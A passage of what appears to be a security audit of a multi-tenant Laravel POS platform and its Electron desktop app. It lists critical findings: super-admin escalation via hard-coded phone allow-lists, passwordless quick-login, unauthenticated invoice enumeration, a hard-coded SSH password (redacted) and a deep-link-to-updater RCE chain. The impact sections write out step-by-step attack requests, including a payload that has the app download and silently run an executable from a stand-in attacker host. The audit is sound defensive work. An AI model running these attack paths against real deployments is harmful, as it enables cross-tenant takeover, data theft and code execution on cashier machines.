3. The super-admin routes run in the tenant's context. In routes/api.php:19, the whole `v1` group, including the `super-admin` group at lines 196-221, uses ResolveApiTenancy. That middleware (lines 30-37) starts tenancy from the client-supplied `X-Tenant` header and skips tenancy only for `api/v1/central/*`, not `super-admin/*`. ApiTokenAuth then resolves the Sanctum token against the tenant DB. In AppServiceProvider.php:38, `Gate::before` returns true when the user `hasRole('super_admin')`, and that check runs against the tenant user's roles. So `can:super_admin.access` passes.

4. The impact is cross-tenant. `App\Models\Tenant` extends stancl's BaseTenant, which uses the central connection. So `Tenant::findOrFail($id)` in SuperAdminApiController (`destroyTenant` at 247, `toggleStatus` at 136, `updateDatabaseConfig` at 268) works on any tenant even while tenant A's context is active.

Attack: a tenant admin sends `PUT /api/v1/users/{own id}` with `X-Tenant: A`, `role=super_admin` and their own name and phone. They can then call `/api/v1/super-admin/*`.

The exploit details need one correction. The plans endpoints may fail in tenant context because `Plan` does not pin the central connection, so 'change plans and pricing' may not work this way. Tenant delete, disable, DB-credential rewrite and app-version management do work, so the severity stays critical.

A second bypass exists. AppServiceProvider.php:38 and :49 grant full access to a hardcoded allowlist of phone numbers, checked on the user in the current (tenant) DB. Phone uniqueness is enforced only within the tenant DB. So a tenant admin can also create a user with one of those phone numbers and get the same platform super-admin access, without using the role at all.

### 7. [CRITICAL] Hard-coded phone numbers in Gate::before let any tenant user become super admin by changing their own phone
- **Location:** `D:\projects\sroor\backend\app\Providers\AppServiceProvider.php:37`
- **Effort:** S
- **Evidence:** Gate::before returns true when `in_array($user->phone, ['<two hard-coded numbers>'])`. This runs before the `super_admin.*` deny branch, so it covers every ability including `super_admin.access`. UpdateProfileRequest::authorize() only checks `$this->user() !== null`. Its phone rule is only `unique:users,phone`, and that uniqueness is checked inside the tenant's own DB. UpdateProfileAction.php:26 then sets `$user->phone = $validated['phone']`. The super-admin API group (routes/api.php:196) is gated only by `can:super_admin.access`. Its controller uses App\Models\Tenant, which extends the stancl BaseTenant and therefore always uses the central connection.
- **Impact:** 1. A cashier at any tenant sends PUT /api/v1/profile with phone set to one of the hard-coded numbers. The number is unique in that tenant's DB, so validation passes. 2. Every Gate check now passes for that user. 3. They call GET/DELETE /api/v1/super-admin/tenants, /tenants/{id}/update-db-config, run-migrations and the platform settings endpoints. Result: the caller can list, modify or delete every tenant. The same numbers also open Pulse (AppServiceProvider.php:48) and Telescope (routes/web.php:38). Cross-tenant takeover of the whole platform.
- **Recommendation:** Remove the phone allow-list from Gate::before, viewPulse and the Telescope bridge. Decide super-admin status only from a central-DB flag or role, checked against the central connection, never from tenant-editable attributes. Only allow the super-admin API on the central domain with a separate central guard. Also stop letting users change their own phone without re-verification.
- **Verification:** I confirmed every step of the chain in the code and found no guard that breaks it.

1. **The bypass.** In `backend/app/Providers/AppServiceProvider.php:37-45`, `Gate::before` returns true when `$user->hasRole('super_admin')` or when the user's phone is one of two hard-coded numbers. This check runs before the `super_admin.*` deny branch on line 41, so it grants every ability.

2. **Any user can set their own phone.** `PUT /api/v1/profile` (`routes/api.php:183`, also `routes/tenant.php:235`) sits only behind `ApiTokenAuth`. There is no permission check on it.
   - `UpdateProfileRequest::authorize()` returns `$this->user() !== null`.
   - The phone rule is `Rule::unique('users','phone')->ignore($userId)`. It runs on the default connection, which is the tenant DB once `ResolveApiTenancy` has initialized tenancy.
   - The only database constraint is the unique index in the tenant users table (`database/migrations/tenant/0001_01_01_000000_create_users_table.php:17`). That index is per tenant, so the number is free in any tenant except the one where the real owner exists.
   - `UpdateProfileAction.php:26` assigns `$user->phone = $validated['phone']` with no further check. No User observer or mutator blocks it.

3. **The super-admin API trusts that gate.** The `super-admin` group (`routes/api.php:196`) is guarded only by `can:super_admin.access`.
   - `SuperAdminApiController` loads tenants with `Tenant::findOrFail()`. `App\Models\Tenant` extends stancl's BaseTenant, which uses `Concerns\CentralConnection`, so these calls hit the central DB even when the request runs in a tenant context. Cross-tenant listing, deletion, DB-config updates and running migrations are all reachable.
   - `StoreTenantRequest::authorize()` returns true.
   - `OverrideTenantFeatureRequest` and `ToggleTenantStatusRequest` hard-code the same two phone numbers again.
   - `UpdateTenantDatabaseConfigRequest` and `UpdateTenantUnitsRequest` also accept `can('super_admin.access')`. No other check exists.

4. **Other places use the same numbers.** They appear in:
   - `viewPulse` (`AppServiceProvider.php:49`)
   - Telescope (`TelescopeServiceProvider.php:82`)
   - `routes/web.php:38`
   - `UserResource.php:19`, which sets `is_super_admin` and so also opens the SPA's super-admin UI.
   - `PopulateRealisticTenantDataCommand.php:145`, which seeds one of the numbers.

**Severity.** Any authenticated user in any tenant, even a cashier, can escalate to platform-wide super admin with one profile update. Critical is justified.

### 8. [CRITICAL] Invoice print routes on tenant domains are unauthenticated and fetch any invoice by sequential id
- **Location:** `D:\projects\sroor\backend\routes\tenant.php:60`
- **Effort:** S
- **Evidence:** tenant.php:60-74 defines GET /invoices/{id}/print, /print/thermal and /print/a4, each calling `Invoice::with(['customer','items.item','additionalExpenses'])->findOrFail($id)`. These routes sit outside the `auth` group, which only starts at line 77. route:list shows the effective middleware as `web, PreventAccessFromCentralDomains, InitializeTenancyByDomain` with no Authenticate. The tenant.php routes register later (in TenancyServiceProvider::mapRoutes inside booted()) and override the identical web.php:56-65 definitions. The SPA opens these URLs directly: InvoicesView.vue:193, PosView.vue:801.
- **Impact:** An anonymous attacker who knows or guesses a tenant subdomain (slugs are short, e.g. `2m.<central-domain>`) loops GET https://<tenant>/invoices/1..N/print/a4. They harvest every invoice of that business: customer names and phones, line items and prices, totals, paid and remaining amounts, and additional expenses. No login, no store check, no rate limit. This is a full data leak of every tenant's sales history.
- **Recommendation:** Move the print routes inside the `auth` group and add `can:invoices.view` plus a store-membership check against the invoice's store_id. If popup or Electron printing needs cookie-less access, use short-lived `URL::temporarySignedRoute` links bound to the invoice id and user, generated by the authenticated API. Use non-sequential public identifiers (ULID) for print links.
- **Verification:** The finding holds up against the code. In backend/routes/tenant.php:60-74, the routes GET /invoices/{id}/print, /print/thermal and /print/a4 sit inside the outer group, whose only middleware is web, InitializeTenancyByDomain and PreventAccessFromCentralDomains. They are declared before the Route::middleware('auth') group that opens at line 77. Each closure calls Invoice::with(['customer','items.item','additionalExpenses'])->findOrFail($id) and has no Gate, can: middleware, store filter or ownership check.

I looked for a guard somewhere else and found none:
- bootstrap/app.php only appends StoreScope to the web group. StoreScope (app/Http/Middleware/StoreScope.php) does nothing for guests: it only sets a session store id when Auth::check() is true, and it never filters queries.
- The Invoice model (app/Models/Invoice.php) has no global scope or store scope, only SoftDeletes.
- No throttle middleware is applied.
- The print views do not reference auth()->user(), so an anonymous request does not crash and the page renders.

resources/views/layouts/print-a4.blade.php:207-304 outputs the customer name, phone, address, paid amount and remaining amount. TenancyServiceProvider::mapRoutes (lines 116-123) registers tenant.php in app->booted, which matches the claim about route order. The same unauthenticated print routes also exist in backend/routes/web.php:56-65 for the central host.

The impact is that anyone who knows the tenant domain can enumerate every invoice in that tenant's database by sequential id, with no login. This exposes customer personal data and the full sales history, and the attack is trivial. Critical severity is justified. The only thing that softens it is that the attacker must know or guess the tenant hostname.

### 9. [CRITICAL] Unauthenticated passwordless login: POST /api/v1/auth/quick-login issues a full-scope token for any user in any tenant
- **Location:** `D:/projects/sroor/backend/routes/api.php:28`
- **Effort:** S
- **Evidence:** routes/api.php:27-29 register /auth/login, /auth/quick-login and /auth/workspace-users OUTSIDE the ApiTokenAuth group (which starts at line 33), inside the ResolveApiTenancy group. AuthController::quickLogin (AuthController.php:115-133) only validates 'login' as a required string. ApiQuickLoginAction::execute (ApiQuickLoginAction.php:23-60) finds the user with where('phone',$login)->orWhere('email',$login)->orWhere('id',$login), checks is_active, then calls createToken($tokenName, ['*']). There is no password, PIN, device binding, environment check or throttle. AuthController::workspaceUsers (lines 93-108), which is also public, lists the id, name and phone/email of every active user. The route is on the pushed origin/feature/multi-tenant (introduced around ae0cc330) and absent from origin/main.
- **Impact:** Anyone on the internet can take over any tenant. Steps: (1) GET /api/v1/auth/workspace-users with X-Tenant: <victim> to list users, or skip this. (2) POST /api/v1/auth/quick-login {login: 1} with the same header. The response is a Sanctum token for the tenant's first user, usually the admin, and it never expires (sanctum expiration=null). The attacker then has full read/write on sales, customers, treasury and users of every tenant whose slug they can guess or enumerate through the unthrottled /central/tenants/resolve. This is an auth bypass and a cross-tenant compromise.
- **Recommendation:** Delete the quick-login and workspace-users routes from the public group immediately. If a cashier fast-switch is needed, make it an authenticated endpoint that requires a per-user PIN (hashed), is scoped to a store/device already holding a valid session, and is throttled. Then revoke all personal_access_tokens issued by quick-login (token name prefix 'quick-login-') on every tenant. Add a feature test that unauthenticated quick-login returns 404/401.
- **Verification:** I confirmed this from the code and found no guard that stops it.

**The route is public.**
- backend/routes/api.php:27-29 registers POST /auth/login, POST /auth/quick-login and GET /auth/workspace-users inside the v1 group. That group only has the ResolveApiTenancy middleware.
- The ApiTokenAuth group starts at line 32. It does not cover these three routes.
- bootstrap/app.php adds no throttle and no auth to the api group. It only appends StoreScope to web and defines aliases.

**No password is checked.**
- AuthController::quickLogin (AuthController.php:115-133) only validates that `login` is a required string and `device_name` is a nullable string.
- ApiQuickLoginAction::execute (app/Actions/Auth/ApiQuickLoginAction.php) looks the user up with where phone = login, or email = login, or id = login, then takes the first match.
- Its only check is is_active. It then calls createToken($tokenName, ['*']) and also writes the token into users.api_token.
- There is no password, PIN, device binding, environment check or rate limit anywhere on this path.

**Tokens never expire.**
- vendor/laravel/sanctum/config/sanctum.php:53 sets 'expiration' => null.
- The app has no config/sanctum.php to override it.

**User enumeration is open.**
- AuthController::workspaceUsers (lines 93-108) is also public. It returns id, name and phone or email for every active user.

**Tenant selection is up to the caller.**
- ResolveApiTenancy lets the client pick the tenant through the X-Tenant header, the ?tenant= query parameter, or the request body. It accepts the tenant id or a domain.
- No membership or ownership check follows. So `{login: "1"}` with any valid tenant id returns a full-scope token for that tenant's user 1.

**Branch history.**
- `git log -S quick-login` points to commit ae0cc330. That commit is on origin/feature/multi-tenant and origin/feature/api-migration.
- `git show origin/main:backend/routes/api.php` contains no "quick", so the route is absent from main. That matches the finding.

**Probably worse than claimed (inferred from the code, not tested).**
- If the request sends no tenant header and comes in on a central host, tenancy is not initialized. The query then runs against the central users table, which exists (database/migrations/0001_01_01_000000_create_users_table.php).
- ApiTokenAuth then has a fallback (fallback 3): in a tenant context it looks the token up in the central DB and accepts it when the central user has the 'admin' role. So a passwordless central-admin token could be accepted in any tenant.

**What limits it.** The finding is real but not unbounded:
- The deployment has to be running this branch.
- The attacker needs a valid tenant identifier.
- Disabled (inactive) users are rejected.

None of these are real barriers to a remote, unauthenticated takeover. The critical severity stands.

### 10. [CRITICAL] Hard-coded phone numbers in Gate::before grant every ability, including super_admin.*, to any user in any tenant DB holding those phones
- **Location:** `D:/projects/sroor/backend/app/Providers/AppServiceProvider.php:38`
- **Effort:** M
- **Evidence:** Gate::before: `if ($user->hasRole('super_admin') || in_array($user->phone, ['<two hard-coded numbers>'])) return true;`. The same pair appears in the viewPulse gate (AppServiceProvider.php:48-50), the Telescope gate (TelescopeServiceProvider.php:82) and several FormRequests (OverrideTenantFeatureRequest.php:13, ToggleTenantStatusRequest.php:13). StoreUserRequest.php:20 only enforces 'unique:users,phone', which is per tenant DB. The super-admin group (routes/api.php:196-220, can:super_admin.access) sits inside the same ResolveApiTenancy + ApiTokenAuth stack as tenant routes. SuperAdminApiController uses Tenant::findOrFail (central-pinned) for destroy, update-db-config, toggle-status, run-migrations and app-versions.
- **Impact:** A tenant admin, or anyone holding a tenant token (see the quick-login finding), creates a user in their own tenant with one of the two phone numbers, logs in with X-Tenant: own-tenant, and calls /api/v1/super-admin/*. Gate::before returns true, so they can list, delete or suspend every tenant, rewrite tenant DB connection config, override plan features, and publish an app-version, which pushes a malicious APK/installer to every tenant's devices. Platform-wide compromise.
- **Recommendation:** Remove every phone/email allow-list from Gate::before, the viewPulse/viewTelescope gates and the FormRequests. Super-admin identity must come only from a central-DB user (CentralUser on the central connection) authenticated on a separate central guard and route group with no tenancy initialization. Never grant super_admin.* based on attributes a tenant can set on its own users. Also remove `|| hasRole('admin')` from the super-admin FormRequests (UpdateTenantDatabaseConfigRequest, UpdatePlatformSettingsRequest, etc.).
- **Verification:** I confirmed this in the code, and the real attack path is easier than the finding claims.

1. The bypass exists. backend/app/Providers/AppServiceProvider.php:37-40 has a Gate::before that returns true when `hasRole('super_admin')` is true or when `in_array($user->phone, [two hard-coded phone numbers])`. That check runs before the `super_admin.*` deny at lines 41-43. The same phone list appears in:
   - the viewPulse gate at AppServiceProvider.php:49
   - the Telescope gate at TelescopeServiceProvider.php:82
   - routes/web.php:38
   - OverrideTenantFeatureRequest.php:13 and ToggleTenantStatusRequest.php:13
   - UserResource.php:19, which sets is_super_admin, so the SPA would also show super-admin UI

2. The phone check is per tenant database. The super-admin routes (routes/api.php:196-220, `can:super_admin.access`) sit in the same API group as the tenant routes. ResolveApiTenancy initialises tenancy from the X-Tenant header, query or host. ApiTokenAuth then loads `User` from the tenant's database. So `$user->phone` is a value stored in the tenant's database. The 'unique:users,phone' rule only applies inside that one database.

3. Escalation is worse than the finding says, because no tenant admin is needed. PUT /api/v1/profile (routes/api.php) uses UpdateProfileRequest. Its authorize() returns true for any logged-in user, and its only phone rule is `unique:users,phone` ignoring the user's own row. UpdateProfileAction then sets `$user->phone = $validated['phone']` (line 26). Any logged-in user in any tenant, such as a cashier, can set their own phone to one of the two numbers. The only condition is that nobody in that tenant's users table already has it. From then on Gate::before returns true for every ability.

4. Super-admin actions reach central data. Stancl's base Tenant model uses `Concerns\CentralConnection` (vendor/stancl/tenancy/src/Database/Models/Tenant.php:24). So `Tenant::findOrFail` in SuperAdminApiController, used by destroyTenant (line 247+), updateDatabaseConfig (line 268+), toggleStatus and the others, works on the central tenants table, even when called from inside a tenant context. That gives cross-tenant delete, suspend, DB-config rewrite, feature override and app-version publishing.

5. I found no other guard that blocks this. No other middleware, policy or database constraint stops it.

A side note: the two FormRequests also allow `hasRole('admin')`. The `can:super_admin.access` route middleware still blocks a plain tenant admin there, unless their phone matches.

Severity stays critical.

### 11. [CRITICAL] Production SSH password hard-coded in about 90 tracked root scripts, and on remote main
- **Location:** `D:/projects/sroor/deploy_sroor.py:9`
- **Effort:** M
- **Evidence:** `PASS = '...' (redacted)` or `password='...' (redacted)`. Hashing the values shows one identical SSH credential in 80 PASS assignments plus 10 password= assignments. Examples: deploy_sroor.py:9, read_webhook.py:7, restore_sroor_db.py:7, backup_sroor_db.py:7, sync_sroor.py:6, publish_windows_version.py:6, check_*.py:5-9, fix_*.py, test_all_live.py:8, test_live_login.py:6, verify_*.py. The scripts also hard-code the SSH host IP, a non-standard port and the Hostinger account username (e.g. read_webhook.py:4-6), and use paramiko AutoAddPolicy (no host-key verification). These scripts were introduced in 97c77b5b, which is contained in origin/main and erp-hub/main, so the secret is already on GitHub in two repositories.
- **Impact:** Anyone with read access to either GitHub repo (or any clone or fork) gets a shell on the production Hostinger account that hosts every tenant's database and the .env with APP_KEY and DB credentials. That is full remote compromise and cross-tenant data theft. AutoAddPolicy also allows MITM of the deploy channel.
- **Recommendation:** Rotate the Hostinger SSH/hPanel password now and switch to SSH key auth with password login disabled. Move host/user/credentials to environment variables or a local untracked config. Delete the ad-hoc scripts from the repo (or move them to an untracked ops folder). Purge them from history with git filter-repo on both remotes and force-push, then ask collaborators to re-clone. Confirm the GitHub repos are private and check the GitHub secret-scanning alerts.
- **Verification:** I confirmed this from the code and git history. D:/projects/sroor/deploy_sroor.py:6-9 hard-codes the SSH host IP (line 6), the non-standard port 65002 (line 7), the Hostinger account username (line 8) and a plaintext SSH password (PASS, line 9, type: SSH account password). TARGET_DIR on line 10 points to the production public_html/sroor path. A git grep over the tracked root .py files finds 90 files with a PASS=/password= literal. Grouped by value, 90 occurrences share one identical 10-character secret, which means one credential is reused everywhere; 2 occurrences hold a different 9-character value. All 90 scripts use paramiko AutoAddPolicy. Commit 97c77b5b is reachable from origin/main, erp-hub/main, origin/feature/multi-tenant and other remote branches. The current tip of origin/main still has 46 secret-bearing .py files, and erp-hub/main has 45. Both remotes are GitHub repos (kamalsroor1/sroor-cofe-erp and kamalsroor1/erp-hub), so the secret is in pushed history on both, and deleting the files now would not remove it. No mitigation exists in code: no env/secret loading and no host-key pinning. One limit on the claimed impact: I could not check whether the GitHub repos are private, so exposure may be limited to collaborators and clones rather than the public. Even then, a shared plaintext SSH password for the account that hosts every tenant DB and the .env stays critical. It needs rotation, a switch to key-based auth, and a history purge.

### 12. [CRITICAL] Unauthenticated passwordless login: POST /api/v1/auth/quick-login issues a full token for any user in any tenant
- **Location:** `D:\projects\sroor\backend\app\Actions\Auth\ApiQuickLoginAction.php:26`
- **Effort:** M
- **Evidence:** routes/api.php:28-29 registers POST /auth/quick-login and GET /auth/workspace-users outside ApiTokenAuth. The only middleware is ResolveApiTenancy, and there is no throttle. ApiQuickLoginAction::execute() looks up User::where(phone=login OR email=login OR id=login)->first(), checks only is_active, then calls $user->createToken(..., ['*']) and writes the plain token to users.api_token. No password, PIN, device binding or feature flag is checked. AuthController::workspaceUsers (lines 93-110) returns id, name and phone/email for every active user without authentication. LoginView.vue:304/331 calls both.
- **Impact:** An anonymous attacker sends GET /api/v1/auth/workspace-users?tenant=<id> to list a tenant's users, then POST /api/v1/auth/quick-login {login:'1', tenant:'<id>'} (or the admin's phone). The response is a bearer token with full abilities for that tenant's admin. Repeating this for each tenant id (ids can be enumerated via the public central resolver) gives full read/write access to every tenant's sales, customers, treasury and users. Without a tenant parameter on the central host, it logs in as a central user. This is a complete authentication bypass across the whole SaaS.
- **Recommendation:** Remove the quick-login route now, or require a per-user PIN/password plus a registered-device secret issued after a normal password login, with throttling (throttle:5,1 keyed by tenant+login+IP). Restrict workspace-users to an authenticated device token, or return only display names without phone/email. Stop persisting plaintext tokens in users.api_token. Revoke all tokens whose name starts with 'quick-login'/'vue-spa-quick' after the fix.
- **Verification:** I confirmed this from the code, and I found no guard anywhere that blocks it.

1. **Route is public.** backend/routes/api.php:28-29 registers POST /auth/quick-login and GET /auth/workspace-users inside the v1 group, whose only middleware is ResolveApiTenancy. They sit outside the ApiTokenAuth group that starts at line 33. There is no throttle middleware and no feature or setting flag. bootstrap/app.php adds no global API auth middleware.

2. **No credential check.** AuthController::quickLogin (lines 115-133) only validates that `login` is a string and `device_name` is nullable. ApiQuickLoginAction::execute (lines 26-30) runs User::where(phone=$login OR email=$login OR id=$login)->first(). The only check is is_active (line 47). It then calls createToken($name, ['*']) (line 55) and saves the plain-text token to users.api_token (line 59). There is no password, PIN, device binding or IP restriction.

3. **User list is public.** AuthController::workspaceUsers (lines 93-110) returns id, name and login (phone or email) for every active user, with no authentication.

4. **Tenant comes from the client.** ResolveApiTenancy accepts an X-Tenant header, a `tenant` query parameter or a `tenant` body field, or resolves the tenant from the host. So an attacker can pick any tenant they can name.

5. **Tokens work across the API.** ApiTokenAuth accepts these Sanctum tokens and also does a fallback lookup on the api_token column.

6. **Tests show it is on purpose.** tests/Feature/Api/AuthApiTest.php has test_quick_login_succeeds_without_password, which asserts this exact behaviour. The design is deliberate, but it is still an authentication bypass.

7. **One more risk the finding missed.** With no tenant, the lookup hits the central database. ApiTokenAuth step 3 (around lines 49-62) then accepts a central admin's token inside any tenant and maps it to that tenant's user with the same phone number. So a central-host quick-login as the central admin probably also gives admin access in every tenant that has a user with that phone. This makes the issue worse, not better.

**Where the finding overstates:** the public resolver (/central/tenants/resolve) resolves one code at a time; it does not list tenants. An attacker still needs each tenant's slug or domain, but these are usually visible in subdomains. login='1' only works if user id 1 exists and is active. Neither point lowers the severity, because any known tenant can be fully taken over without authentication.

### 13. [CRITICAL] Any tenant user can become platform super-admin by setting their own phone to a hardcoded number (Gate::before phone allow-list)
- **Location:** `D:\projects\sroor\backend\app\Providers\AppServiceProvider.php:38`
- **Effort:** M
- **Evidence:** Gate::before returns true when in_array($user->phone, [<two hardcoded numbers>]), and it runs before the super_admin.* deny branch. The user is resolved from the tenant DB on tenant requests. UpdateProfileRequest.php:23 allows phone ['required','string','max:20', Rule::unique('users','phone')->ignore($userId)]. That is unique only inside the tenant DB, where these numbers don't exist. UpdateProfileAction.php:26 then saves $user->phone. PUT /profile is available to any authenticated user (api.php:183, tenant.php:235). The same allow-list appears in UserResource.php:19, OverrideTenantFeatureRequest, ToggleTenantStatusRequest and viewPulse.
- **Impact:** A cashier in tenant A sends PUT /api/v1/profile with phone=<allow-listed number>. Every Gate check then passes, including can:super_admin.access on /api/v1/super-admin/*. The cashier can list or delete tenants, change tenant DB configs, run migrations, and publish app releases (StoreAppVersionRequest uses can('system.manage')). This gives cross-tenant takeover and a path into the desktop update channel. Combined with quick-login, an anonymous attacker can do this too.
- **Recommendation:** Delete every phone-based allow-list. Base super-admin on a central-DB-only flag or role, checked against the central connection (e.g. a CentralAdmin model or a separate guard), and never grant it to users resolved from a tenant DB. Make super-admin routes refuse requests where tenancy is initialized.
- **Verification:** I confirmed this from the code and found no guard that stops it.

**The allow-list**
- In AppServiceProvider.php:37-45, `Gate::before` returns true when `in_array($user->phone, [two hardcoded numbers])` is true.
- That check runs before the branch that denies `super_admin.*`, so it overrides the deny.
- `viewPulse` (line 49), UserResource.php:19 (`is_super_admin`), OverrideTenantFeatureRequest:13, ToggleTenantStatusRequest:13 and TelescopeServiceProvider:82 all use the same allow-list.

**How a user gets on it**
- UpdateProfileRequest's `authorize()` only checks that `user() !== null`.
- Its phone rule is `Rule::unique('users','phone')->ignore($userId)` with no connection set. With tenancy active, that resolves against the tenant DB, where the allow-listed numbers normally don't exist.
- UpdateProfileAction.php:26 then assigns `$user->phone` directly and saves.
- `PUT /profile` sits in the ApiTokenAuth group with no permission middleware (api.php:183; tenant.php:235).

**Why it reaches super-admin routes**
- ResolveApiTenancy runs first and starts tenancy from the X-Tenant header or the host, so ApiTokenAuth loads the user from the tenant DB.
- `/api/v1/super-admin/*` (api.php:196) is protected only by `can:super_admin.access`, and `Gate::before` short-circuits that check.
- Nothing in the middleware stops tenant context from reaching these routes.
- `Tenant` extends stancl's BaseTenant, which uses CentralConnection. So `destroyTenant` (`Tenant::findOrFail` plus DeleteTenantAction), the tenant listing, toggle-status, update-db-config and similar actions work against the central DB even while a tenant is active.

**Attack path**
A cashier sends PUT /profile with an allow-listed phone, then calls the super-admin endpoints and can delete or change other tenants. The same `Gate::before` also gives them every permission inside their own tenant.

**What may be overstated**
- Some super-admin actions that use `Plan` (no pinned connection) may fail in tenant context.
- I did not check the quick-login claim, which is what would let an anonymous attacker do this.

Neither point changes the core issue: any authenticated tenant user can take over the platform with one request.

### 14. [CRITICAL] Electron: deep link sroor://connect?tenant= loads attacker-controlled origin with full preload bridge, and the updater IPC downloads and silently executes any EXE (one-click RCE)
- **Location:** `D:\projects\sroor\desktop\main.js:42`
- **Effort:** L
- **Evidence:** parseTenantFromDeepLink (main.js:26-38) takes searchParams.get('tenant') with only trim/lowercase. applyDeepLinkTenant and getTargetAppUrl build `https://${tenantCode}.baraa-solutions.com` with no hostname validation, persist it as serverUrl, and loadURL it in mainWindow, which has preload.js. A value such as 'evil.example/' or 'evil.example#' changes the host. The will-navigate handler (line 238) is empty and there is no setWindowOpenHandler. preload.js exposes updater.downloadAndInstall(data) and saveSettings(settings). main.js:539 passes data.downloadUrl straight to nativeUpdater.downloadAndApplyUpdate. That function downloads over http or https, follows redirects to any URL (nativeUpdater.js:15-18), and runs spawn(updateExePath, ['/S']) (line 98) with no hash, signature or host check. The cold-start failure page (line 318) also interpolates targetUrl unescaped into a data: HTML page that loads in the preloaded window.
- **Impact:** An attacker sends a POS operator a link or web page that triggers sroor://connect?tenant=evil.example%2F. The desktop app opens https://evil.example/.baraa-solutions.com/login with window.electronAPI available. The page calls electronAPI.updater.downloadAndInstall({downloadUrl:'http://evil/x.exe'}), which runs the attacker's binary silently on the cashier PC, along with the printer and cash drawer. The bad serverUrl is persisted, so it survives restarts. Any stored XSS in the tenant SPA reaches the same RCE without a deep link.
- **Recommendation:** Validate the tenant code against /^[a-z0-9-]{1,63}$/ and construct the URL with new URL() before checking hostname.endsWith('.baraa-solutions.com'). Block navigation and window.open to other origins using will-navigate, will-redirect and setWindowOpenHandler. In every ipcMain handler, check event.senderFrame.url against the allowed origin. Never take the update URL from the renderer: have the main process fetch the update manifest from a fixed HTTPS host, enforce HTTPS on every redirect, verify the SHA-256 from a signed manifest, and verify the Authenticode signature (or switch to electron-updater with code signing). Escape targetUrl in the retry page or load it from a file.
- **Verification:** Confirmed from the code. I found no guard that blocks this chain.

1) Deep link handling. desktop/main.js:26-38 `parseTenantFromDeepLink` returns `searchParams.get('tenant'|'code')` after only trim and toLowerCase. `searchParams.get` URL-decodes the value, so `%2F` arrives as `/`.

2) Origin takeover. `applyDeepLinkTenant` (main.js:40-52) builds `https://${tenantCode}.baraa-solutions.com` with no hostname or regex check. The cold-start path `getTargetAppUrl` (main.js:64-70) does the same. A tenant value of `evil.example/` gives `https://evil.example/.baraa-solutions.com`, so the host becomes evil.example. Both paths save it to settingsStore `serverUrl`, so it survives restarts, and then call `mainWindow.loadURL`. The `second-instance` handler (main.js:92-101) reaches this for warm links.

3) The bridge is exposed to any origin. mainWindow (main.js:148-154) loads preload.js with contextIsolation, but that does not limit which origin gets the bridge. The `will-navigate` handler (main.js:238-240) is empty and does not call preventDefault. There is no `setWindowOpenHandler` and no `web-contents-created` hardening. No `ipcMain.handle` checks `event.senderFrame.url` or origin.

4) Arbitrary code execution. preload.js exposes `updater.downloadAndInstall(data)`. main.js:538-541 passes `data.downloadUrl` straight to `downloadAndApplyUpdate`. In src/updater/nativeUpdater.js:
   - It accepts http or https.
   - It follows redirects to any location (lines 15-18).
   - It writes the file to %TEMP%\*.exe.
   - It runs `spawn(updateExePath, ['/S'], {detached:true})`.
   There is no hash, Authenticode, or host check. Because Node's http client does the download, the file gets no Mark-of-the-Web, so SmartScreen does not prompt.

5) Secondary paths.
   - `saveSettings` (main.js:513-524) lets the renderer set any serverUrl and load it, which is also persisted.
   - The did-fail-load page (main.js:318) puts targetUrl into a data: HTML page without escaping, and that page loads in the same preloaded window.
   - Any stored XSS in the tenant SPA, or any navigation to an external link in mainWindow, reaches the same updater IPC.

Only small friction remains. A browser normally shows an "Open app?" prompt for custom protocols, so the attack takes one click plus that confirmation. That does not lower the severity: the result is unauthenticated remote code execution on POS terminals.

Key locations: D:\projects\sroor\desktop\main.js:26-52, 64-70, 238, 318, 513-524, 538-541; D:\projects\sroor\desktop\preload.js (updater.downloadAndInstall, saveSettings); D:\projects\sroor\desktop\src\updater\nativeUpdater.js (redirect follow at lines 15-18, spawn of the installer with /S).

### 15. [HIGH] Central 'admin' users get silent admin access to every tenant, through both password login and token fallback; the seeder ships default credentials
- **Location:** `D:\projects\sroor\backend\app\Http\Middleware\ApiTokenAuth.php:51`
- **Effort:** M
- **Evidence:** ApiTokenAuth.php:51-62: in tenant context, if the token is not found in the tenant DB, it is looked up in the central DB (Sanctum or plain api_token). If that central user hasRole('admin'), the request authenticates as the tenant user with the same phone. ApiLoginAction.php:37-58 and LoginAction.php:43-63: if login fails in the tenant, the central user's password is checked. For a central 'admin', the action firstOrCreate()s a tenant user with that phone and syncRoles(['admin']). No audit flag marks it as support access, and the tenant is not notified. TenantProvisionerService never creates central users, so central admins are platform staff. But central roles are checked by role NAME only, and 'admin' is the same role name used for tenant shop admins. DatabaseSeeder.php:20-41 creates both central super-admins with default passwords written as literals in the tracked file (redacted). Pre-existing on this branch.
- **Impact:** Anyone holding a central admin credential can log into any tenant as admin with POST /api/v1/auth/login, X-Tenant: <any>, and the central phone/password. That credential could be a seeded default never changed in production, a leaked one, or one obtained through the quick-login issue above. The fallback also creates a persistent admin account inside the victim tenant's DB, so access survives a central password change. A central token alone is enough through the ApiTokenAuth fallback. Tokens 'issued in tenant A' are not usable in B, but tokens from the central DB are usable in every tenant. This contradicts multi-tenancy rule 3.
- **Recommendation:** Remove both central fallbacks from ApiTokenAuth and the login actions. Replace them with the existing stancl impersonation flow (ImpersonateTenantAction plus a short TTL), started only from an authenticated central super-admin route and logged in the tenant's activity log. Rotate the seeded super-admin passwords and move the seed values to env/one-time setup. Check production for tenant users auto-created by the fallback.
- **Verification:** I confirmed this in the code, and found no guard elsewhere that blocks it.

**Routes.** In routes/api.php:18-33, ResolveApiTenancy wraps all of /api/v1, so tenancy is initialized from X-Tenant or the host before anything else runs. POST /auth/login (line 27) is public. ApiTokenAuth guards the protected group (line 33). The web login in routes/tenant.php:29 uses AuthenticatedSessionController, which calls LoginAction.

**ApiTokenAuth.php:51-62.** In tenant context it calls `tenancy()->central(...)` to look up the token in the central DB, either as a Sanctum PersonalAccessToken or a plain api_token. It checks only `hasRole('admin')`, which is a role name and not a platform-only role. If that passes, it authenticates as the tenant user with the same phone. So any central admin's token works in every tenant once a same-phone tenant user exists, and the login fallback creates that user.

**ApiLoginAction.php:37-58.** If no tenant user matches the phone or email, it fetches the central user and checks the password and `hasRole('admin')`. It then runs `User::firstOrCreate` for a tenant user, which copies the central password hash, and `syncRoles([admin])`. That leaves a persistent admin account in the victim tenant.

**LoginAction.php:41-61 is worse than claimed.** It falls back whenever the tenant login attempt fails, even when a tenant user with that phone already exists. In that case `firstOrCreate` returns the existing tenant user and `syncRoles([admin])` replaces that user's roles with admin before `Auth::login`.

**No audit or notification.** The only logging is the generic `ActivityLogService` 'login' / 'api_login' entry. Nothing marks the session as support or impersonation access, and the tenant is not told. A separate impersonation-token migration exists (2026_08_20_170000_create_tenant_user_impersonation_tokens_table.php), but this path bypasses it.

